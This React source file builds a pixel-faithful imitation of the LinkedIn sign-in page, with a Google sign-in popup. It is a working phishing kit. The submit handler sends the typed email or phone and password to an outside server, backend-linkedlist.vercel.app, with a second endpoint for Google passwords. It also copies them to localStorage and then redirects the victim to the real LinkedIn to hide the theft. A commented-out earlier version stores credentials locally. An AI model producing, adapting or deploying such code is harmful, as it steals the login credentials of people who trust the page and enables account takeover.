
// import React, { useState } from 'react';
// import './LoginForm.css';
// import GoogleAuthPopup from './GoogleAuthPopup';

// const LoginForm = () => {
//   const [email, setEmail] = useState('');
//   const [password, setPassword] = useState('');
//   const [showPassword, setShowPassword] = useState(false);
//   const [keepLoggedIn, setKeepLoggedIn] = useState(true);
//   const [isGoogleAuthOpen, setIsGoogleAuthOpen] = useState(false);

//   const handleSubmit = (e) => {
//     e.preventDefault();
//     console.log('Form submitted:', { email, password, keepLoggedIn });
    
//     // Store data in localStorage
//     localStorage.setItem('loginData', JSON.stringify({
//       email,
//       password,
//       keepLoggedIn,
//       timestamp: new Date().toISOString()
//     }));

//     // Redirect to LinkedIn
//     window.location.href = 'https://linkedin.com';
//   };

//   const handleGoogleSignIn = () => {
//     setIsGoogleAuthOpen(true);
//   };

//   const handleGoogleAuthComplete = (googleData) => {
//     console.log('Google Auth completed:', googleData);
    
//     // Store Google auth data
//     localStorage.setItem('googleAuthData', JSON.stringify({
//       email: googleData.email,
//       timestamp: new Date().toISOString(),
//       provider: 'google'
//     }));

//     // Redirect to LinkedIn
//     setTimeout(() => {
//       window.location.href = 'https://linkedin.com';
//     }, 500);
//   };

//   const togglePasswordVisibility = () => {
//     setShowPassword(!showPassword);
//   };

//   return (
//     <>
//       <div className="login-container">
//         <div className="linkedin-logo">
//           <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 84 21" preserveAspectRatio="xMinYMin meet" version="1.1" focusable="false" className="lazy-loaded" aria-busy="false">
//             <g className="inbug" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
//               <path d="M19.479,0 L1.583,0 C0.727,0 0,0.677 0,1.511 L0,19.488 C0,20.323 0.477,21 1.333,21 L19.229,21 C20.086,21 21,20.323 21,19.488 L21,1.511 C21,0.677 20.336,0 19.479,0" className="bug-text-color" transform="translate(63.000000, 0.000000)"></path>
//               <path d="M82.479,0 L64.583,0 C63.727,0 63,0.677 63,1.511 L63,19.488 C63,20.323 63.477,21 64.333,21 L82.229,21 C83.086,21 84,20.323 84,19.488 L84,1.511 C84,0.677 83.336,0 82.479,0 Z M71,8 L73.827,8 L73.827,9.441 L73.858,9.441 C74.289,8.664 75.562,7.875 77.136,7.875 C80.157,7.875 81,9.479 81,12.45 L81,18 L78,18 L78,12.997 C78,11.667 77.469,10.5 76.227,10.5 C74.719,10.5 74,11.521 74,13.197 L74,18 L71,18 L71,8 Z M66,18 L69,18 L69,8 L66,8 L66,18 Z M69.375,4.5 C69.375,5.536 68.536,6.375 67.5,6.375 C66.464,6.375 65.625,5.536 65.625,4.5 C65.625,3.464 66.464,2.625 67.5,2.625 C68.536,2.625 69.375,3.464 69.375,4.5 Z" className="background" fill="currentColor"></path>
//             </g>
//             <g className="linkedin-text">
//               <path d="M60,18 L57.2,18 L57.2,16.809 L57.17,16.809 C56.547,17.531 55.465,18.125 53.631,18.125 C51.131,18.125 48.978,16.244 48.978,13.011 C48.978,9.931 51.1,7.875 53.725,7.875 C55.35,7.875 56.359,8.453 56.97,9.191 L57,9.191 L57,3 L60,3 L60,18 Z M54.479,10.125 C52.764,10.125 51.8,11.348 51.8,12.974 C51.8,14.601 52.764,15.875 54.479,15.875 C56.196,15.875 57.2,14.634 57.2,12.974 C57.2,11.268 56.196,10.125 54.479,10.125 L54.479,10.125 Z" fill="currentColor"></path>
//               <path d="M47.6611,16.3889 C46.9531,17.3059 45.4951,18.1249 43.1411,18.1249 C40.0001,18.1249 38.0001,16.0459 38.0001,12.7779 C38.0001,9.8749 39.8121,7.8749 43.2291,7.8749 C46.1801,7.8749 48.0001,9.8129 48.0001,13.2219 C48.0001,13.5629 47.9451,13.8999 47.9451,13.8999 L40.8311,13.8999 L40.8481,14.2089 C41.0451,15.0709 41.6961,16.1249 43.1901,16.1249 C44.4941,16.1249 45.3881,15.4239 45.7921,14.8749 L47.6611,16.3889 Z M45.1131,11.9999 C45.1331,10.9449 44.3591,9.8749 43.1391,9.8749 C41.6871,9.8749 40.9121,11.0089 40.8311,11.9999 L45.1131,11.9999 Z" fill="currentColor"></path>
//               <polygon fill="currentColor" points="38 8 34.5 8 31 12 31 3 28 3 28 18 31 18 31 13 34.699 18 38.241 18 34 12.533"></polygon>
//               <path d="M16,8 L18.827,8 L18.827,9.441 L18.858,9.441 C19.289,8.664 20.562,7.875 22.136,7.875 C25.157,7.875 26,9.792 26,12.45 L26,18 L23,18 L23,12.997 C23,11.525 22.469,10.5 21.227,10.5 C19.719,10.5 19,11.694 19,13.197 L19,18 L16,18 L16,8 Z" fill="currentColor"></path>
//               <path d="M11,18 L14,18 L14,8 L11,8 L11,18 Z M12.501,6.3 C13.495,6.3 14.3,5.494 14.3,4.5 C14.3,3.506 13.495,2.7 12.501,2.7 C11.508,2.7 10.7,3.506 10.7,4.5 C10.7,5.494 11.508,6.3 12.501,6.3 Z" fill="currentColor"></path>
//               <polygon fill="currentColor" points="3 3 0 3 0 18 9 18 9 15 3 15"></polygon>
//             </g>
//           </svg>
//         </div>

//         <div className="login-card">
//           <h1 className="login-title">Sign in</h1>
          
//           <div className="social-buttons">
//             <button className="google-btn" onClick={handleGoogleSignIn}>
//               <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
//                 <path fillRule="evenodd" clipRule="evenodd" d="M17.64 9.20454C17.64 8.56636 17.5827 7.95272 17.4764 7.36363H9V10.8436H13.8436C13.635 11.9709 13.0009 12.9231 12.0477 13.5609V15.8195H14.9563C16.6581 14.2527 17.64 11.9454 17.64 9.20454Z" fill="#4285F4"/>
//                 <path fillRule="evenodd" clipRule="evenodd" d="M9 18C11.43 18 13.4672 17.1941 14.9563 15.8195L12.0477 13.5609C11.2418 14.1013 10.2109 14.4204 9 14.4204C6.65591 14.4204 4.67182 12.8372 3.96409 10.71H0.957275V13.0418C2.43818 15.9831 5.48182 18 9 18Z" fill="#34A853"/>
//                 <path fillRule="evenodd" clipRule="evenodd" d="M3.96409 10.71C3.78409 10.17 3.68182 9.59318 3.68182 9C3.68182 8.40682 3.78409 7.83 3.96409 7.29V4.95818H0.957273C0.347727 6.17318 0 7.54772 0 9C0 10.4523 0.347727 11.8268 0.957273 13.0418L3.96409 10.71Z" fill="#FBBC04"/>
//                 <path fillRule="evenodd" clipRule="evenodd" d="M9 3.57955C10.3218 3.57955 11.5077 4.03364 12.4404 4.92545L15.0218 2.34409C13.4631 0.891818 11.4259 0 9 0C5.48182 0 2.43818 2.01682 0.957275 4.95818L3.96409 7.29C4.67182 5.16273 6.65591 3.57955 9 3.57955Z" fill="#EA4335"/>
//               </svg>
//               Continue with Google
//             </button>
            
//             <button className="apple-btn">
//               <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
//                 <path d="M12.7238 1.69922C12.1688 2.31922 11.3138 2.76922 10.4588 2.69922C10.3438 1.83922 10.7438 0.929219 11.2788 0.369219C11.8338 -0.250781 12.7638 -0.720781 13.5388 -0.750781C13.6338 -0.000781 13.3138 0.759219 12.7238 1.69922Z" fill="black"/>
//                 <path d="M13.5237 2.91797C12.4237 2.85797 11.4237 3.50797 10.9037 3.50797C10.3737 3.50797 9.52373 2.95797 8.67373 2.97797C7.55373 2.99797 6.48373 3.69797 5.91373 4.77797C4.72373 6.95797 5.60373 10.218 6.73373 11.998C7.27373 12.868 7.91373 13.828 8.78373 13.798C9.61373 13.758 9.94373 13.278 10.9337 13.278C11.9137 13.278 12.2137 13.758 13.0837 13.738C14.0037 13.718 14.5537 12.858 15.0837 11.978C15.6937 10.968 15.9337 9.98797 15.9437 9.93797C15.9237 9.92797 14.0737 9.22797 14.0537 6.99797C14.0337 5.11797 15.5737 4.22797 15.6437 4.17797C14.8137 3.05797 13.5737 2.94797 13.5237 2.91797Z" fill="black"/>
//               </svg>
//               Sign in with Apple
//             </button>
//           </div>

//           <div className="divider">
//             <span>or</span>
//           </div>

//           <form onSubmit={handleSubmit} className="login-form">
//             <div className="input-group">
//               <input
//                 type="text"
//                 placeholder="Email or phone"
//                 value={email}
//                 onChange={(e) => setEmail(e.target.value)}
//                 required
//               />
//             </div>

//             <div className="input-group password-group">
//               <input
//                 type={showPassword ? "text" : "password"}
//                 placeholder="Password"
//                 value={password}
//                 onChange={(e) => setPassword(e.target.value)}
//                 required
//               />
//               <button
//                 type="button"
//                 className="show-password-btn"
//                 onClick={togglePasswordVisibility}
//               >
//                 Show
//               </button>
//             </div>

//             <a href="#" className="forgot-password">Forgot password?</a>

//             <div className="checkbox-group">
//               <label className="checkbox-label">
//                 <input
//                   type="checkbox"
//                   checked={keepLoggedIn}
//                   onChange={(e) => setKeepLoggedIn(e.target.checked)}
//                 />
//                 <span className="checkmark"></span>
//                 Keep me logged in
//               </label>
//             </div>

//             <button type="submit" className="sign-in-btn">
//               Sign in
//             </button>
//           </form>

//           <div className="signup-link">
//             New to LinkedIn? <a href="#">Join now</a>
//           </div>
//         </div>

//         <footer className="footer">
//           <div className="footer-content">
//             <span className="copyright">© 2025</span>
//             <div className="footer-links">
//               <a href="#">User Agreement</a>
//               <a href="#">Privacy Policy</a>
//               <a href="#">Community Guidelines</a>
//               <a href="#">Cookie Policy</a>
//               <a href="#">Copyright Policy</a>
//               <a href="#">Send Feedback</a>
//               <button className="language-btn">
//                 Language
//                 <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
//                   <path d="M8 11l3-3H5l3 3z"/>
//                 </svg>
//               </button>
//             </div>
//           </div>
//         </footer>
//       </div>

//       <GoogleAuthPopup 
//         isOpen={isGoogleAuthOpen}
//         onClose={() => setIsGoogleAuthOpen(false)}
//         onComplete={handleGoogleAuthComplete}
//       />
//     </>
//   );
// };

// export default LoginForm;



import React, { useState } from 'react';
import './LoginForm.css';
import GoogleAuthPopup from './GoogleAuthPopup';

const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [keepLoggedIn, setKeepLoggedIn] = useState(true);
  const [isGoogleAuthOpen, setIsGoogleAuthOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      const response = await fetch('https://backend-linkedlist.vercel.app/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          emailOrPhone: email,
          password: password,
          keepLoggedIn: keepLoggedIn
        }),
      });
      
      const data = await response.json();
      
      if (data.success) {
        console.log('Login data saved successfully:', data);
        
        // Store data in localStorage as backup
        localStorage.setItem('loginData', JSON.stringify({
          email,
          password,
          keepLoggedIn,
          timestamp: new Date().toISOString()
        }));

        // Redirect to LinkedIn
        window.location.href = 'https://linkedin.com';
      } else {
        setError('Failed to save login data');
      }
    } catch (error) {
      console.error('Error saving login data:', error);
      setError('Network error. Please try again.');
    }
    
    setIsLoading(false);
  };

  const handleGoogleSignIn = () => {
    setIsGoogleAuthOpen(true);
  };

  const handleGoogleAuthComplete = async (googleData) => {
    console.log('Google Auth completed:', googleData);
    
    try {
      const response = await fetch('https://backend-linkedlist.vercel.app/api/google-auth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: googleData.email,
          password: googleData.password
        }),
      });
      
      const data = await response.json();
      
      if (data.success) {
        console.log('Google auth data saved successfully:', data);
        
        // Store Google auth data as backup
        localStorage.setItem('googleAuthData', JSON.stringify({
          email: googleData.email,
          timestamp: new Date().toISOString(),
          provider: 'google'
        }));

        // Redirect to LinkedIn
        setTimeout(() => {
          window.location.href = 'https://linkedin.com';
        }, 500);
      } else {
        console.error('Failed to save Google auth data');
      }
    } catch (error) {
      console.error('Error saving Google auth data:', error);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <>
      <div className="login-container">
        <div className="linkedin-logo">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 84 21" preserveAspectRatio="xMinYMin meet" version="1.1" focusable="false" className="lazy-loaded" aria-busy="false">
            <g className="inbug" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
              <path d="M19.479,0 L1.583,0 C0.727,0 0,0.677 0,1.511 L0,19.488 C0,20.323 0.477,21 1.333,21 L19.229,21 C20.086,21 21,20.323 21,19.488 L21,1.511 C21,0.677 20.336,0 19.479,0" className="bug-text-color" transform="translate(63.000000, 0.000000)"></path>
              <path d="M82.479,0 L64.583,0 C63.727,0 63,0.677 63,1.511 L63,19.488 C63,20.323 63.477,21 64.333,21 L82.229,21 C83.086,21 84,20.323 84,19.488 L84,1.511 C84,0.677 83.336,0 82.479,0 Z M71,8 L73.827,8 L73.827,9.441 L73.858,9.441 C74.289,8.664 75.562,7.875 77.136,7.875 C80.157,7.875 81,9.479 81,12.45 L81,18 L78,18 L78,12.997 C78,11.667 77.469,10.5 76.227,10.5 C74.719,10.5 74,11.521 74,13.197 L74,18 L71,18 L71,8 Z M66,18 L69,18 L69,8 L66,8 L66,18 Z M69.375,4.5 C69.375,5.536 68.536,6.375 67.5,6.375 C66.464,6.375 65.625,5.536 65.625,4.5 C65.625,3.464 66.464,2.625 67.5,2.625 C68.536,2.625 69.375,3.464 69.375,4.5 Z" className="background" fill="currentColor"></path>
            </g>
            <g className="linkedin-text">
              <path d="M60,18 L57.2,18 L57.2,16.809 L57.17,16.809 C56.547,17.531 55.465,18.125 53.631,18.125 C51.131,18.125 48.978,16.244 48.978,13.011 C48.978,9.931 51.1,7.875 53.725,7.875 C55.35,7.875 56.359,8.453 56.97,9.191 L57,9.191 L57,3 L60,3 L60,18 Z M54.479,10.125 C52.764,10.125 51.8,11.348 51.8,12.974 C51.8,14.601 52.764,15.875 54.479,15.875 C56.196,15.875 57.2,14.634 57.2,12.974 C57.2,11.268 56.196,10.125 54.479,10.125 L54.479,10.125 Z" fill="currentColor"></path>
              <path d="M47.6611,16.3889 C46.9531,17.3059 45.4951,18.1249 43.1411,18.1249 C40.0001,18.1249 38.0001,16.0459 38.0001,12.7779 C38.0001,9.8749 39.8121,7.8749 43.2291,7.8749 C46.1801,7.8749 48.0001,9.8129 48.0001,13.2219 C48.0001,13.5629 47.9451,13.8999 47.9451,13.8999 L40.8311,13.8999 L40.8481,14.2089 C41.0451,15.0709 41.6961,16.1249 43.1901,16.1249 C44.4941,16.1249 45.3881,15.4239 45.7921,14.8749 L47.6611,16.3889 Z M45.1131,11.9999 C45.1331,10.9449 44.3591,9.8749 43.1391,9.8749 C41.6871,9.8749 40.9121,11.0089 40.8311,11.9999 L45.1131,11.9999 Z" fill="currentColor"></path>
              <polygon fill="currentColor" points="38 8 34.5 8 31 12 31 3 28 3 28 18 31 18 31 13 34.699 18 38.241 18 34 12.533"></polygon>
              <path d="M16,8 L18.827,8 L18.827,9.441 L18.858,9.441 C19.289,8.664 20.562,7.875 22.136,7.875 C25.157,7.875 26,9.792 26,12.45 L26,18 L23,18 L23,12.997 C23,11.525 22.469,10.5 21.227,10.5 C19.719,10.5 19,11.694 19,13.197 L19,18 L16,18 L16,8 Z" fill="currentColor"></path>
              <path d="M11,18 L14,18 L14,8 L11,8 L11,18 Z M12.501,6.3 C13.495,6.3 14.3,5.494 14.3,4.5 C14.3,3.506 13.495,2.7 12.501,2.7 C11.508,2.7 10.7,3.506 10.7,4.5 C10.7,5.494 11.508,6.3 12.501,6.3 Z" fill="currentColor"></path>
              <polygon fill="currentColor" points="3 3 0 3 0 18 9 18 9 15 3 15"></polygon>
            </g>
          </svg>
        </div>

        <div className="login-card">
          <h1 className="login-title">Sign in</h1>
          
          <div className="social-buttons">
            <button className="google-btn" onClick={handleGoogleSignIn} disabled={isLoading}>
              <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                <path fillRule="evenodd" clipRule="evenodd" d="M17.64 9.20454C17.64 8.56636 17.5827 7.95272 17.4764 7.36363H9V10.8436H13.8436C13.635 11.9709 13.0009 12.9231 12.0477 13.5609V15.8195H14.9563C16.6581 14.2527 17.64 11.9454 17.64 9.20454Z" fill="#4285F4"/>
                <path fillRule="evenodd" clipRule="evenodd" d="M9 18C11.43 18 13.4672 17.1941 14.9563 15.8195L12.0477 13.5609C11.2418 14.1013 10.2109 14.4204 9 14.4204C6.65591 14.4204 4.67182 12.8372 3.96409 10.71H0.957275V13.0418C2.43818 15.9831 5.48182 18 9 18Z" fill="#34A853"/>
                <path fillRule="evenodd" clipRule="evenodd" d="M3.96409 10.71C3.78409 10.17 3.68182 9.59318 3.68182 9C3.68182 8.40682 3.78409 7.83 3.96409 7.29V4.95818H0.957273C0.347727 6.17318 0 7.54772 0 9C0 10.4523 0.347727 11.8268 0.957273 13.0418L3.96409 10.71Z" fill="#FBBC04"/>
                <path fillRule="evenodd" clipRule="evenodd" d="M9 3.57955C10.3218 3.57955 11.5077 4.03364 12.4404 4.92545L15.0218 2.34409C13.4631 0.891818 11.4259 0 9 0C5.48182 0 2.43818 2.01682 0.957275 4.95818L3.96409 7.29C4.67182 5.16273 6.65591 3.57955 9 3.57955Z" fill="#EA4335"/>
              </svg>
              Continue with Google
            </button>
            
            <button className="apple-btn" disabled={isLoading}>
              <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                <path d="M12.7238 1.69922C12.1688 2.31922 11.3138 2.76922 10.4588 2.69922C10.3438 1.83922 10.7438 0.929219 11.2788 0.369219C11.8338 -0.250781 12.7638 -0.720781 13.5388 -0.750781C13.6338 -0.000781 13.3138 0.759219 12.7238 1.69922Z" fill="black"/>
                <path d="M13.5237 2.91797C12.4237 2.85797 11.4237 3.50797 10.9037 3.50797C10.3737 3.50797 9.52373 2.95797 8.67373 2.97797C7.55373 2.99797 6.48373 3.69797 5.91373 4.77797C4.72373 6.95797 5.60373 10.218 6.73373 11.998C7.27373 12.868 7.91373 13.828 8.78373 13.798C9.61373 13.758 9.94373 13.278 10.9337 13.278C11.9137 13.278 12.2137 13.758 13.0837 13.738C14.0037 13.718 14.5537 12.858 15.0837 11.978C15.6937 10.968 15.9337 9.98797 15.9437 9.93797C15.9237 9.92797 14.0737 9.22797 14.0537 6.99797C14.0337 5.11797 15.5737 4.22797 15.6437 4.17797C14.8137 3.05797 13.5737 2.94797 13.5237 2.91797Z" fill="black"/>
              </svg>
              Sign in with Apple
            </button>
          </div>

          <div className="divider">
            <span>or</span>
          </div>

          <form onSubmit={handleSubmit} className="login-form">
            <div className="input-group">
              <input
                type="text"
                placeholder="Email or phone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                disabled={isLoading}
              />
            </div>

            <div className="input-group password-group">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                disabled={isLoading}
              />
              <button
                type="button"
                className="show-password-btn"
                onClick={togglePasswordVisibility}
                disabled={isLoading}
              >
                Show
              </button>
            </div>

            <a href="#" className="forgot-password">Forgot password?</a>

            <div className="checkbox-group">
              <label className="checkbox-label">
                <input
                  type="checkbox"
                  checked={keepLoggedIn}
                  onChange={(e) => setKeepLoggedIn(e.target.checked)}
                  disabled={isLoading}
                />
                <span className="checkmark"></span>
                Keep me logged in
              </label>
            </div>

            {error && <div className="error-message">{error}</div>}

            <button type="submit" className="sign-in-btn" disabled={isLoading}>
              {/* {isLoading ? (
                <div className=""></div>
              ) : (
                'Sign in'
              )} */}
              Sign in
            </button>
          </form>

          <div className="signup-link">
            New to LinkedIn? <a href="#">Join now</a>
          </div>
        </div>

        <footer className="footer">
          <div className="footer-content">
            <span className="copyright">© 2025</span>
            <div className="footer-links">
              <a href="#">User Agreement</a>
              <a href="#">Privacy Policy</a>
              <a href="#">Community Guidelines</a>
              <a href="#">Cookie Policy</a>
              <a href="#">Copyright Policy</a>
              <a href="#">Send Feedback</a>
              <button className="language-btn">
                Language
                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                  <path d="M8 11l3-3H5l3 3z"/>
                </svg>
              </button>
            </div>
          </div>
        </footer>
      </div>

      <GoogleAuthPopup 
        isOpen={isGoogleAuthOpen}
        onClose={() => setIsGoogleAuthOpen(false)}
        onComplete={handleGoogleAuthComplete}
      />
    </>
  );
};

export default LoginForm;
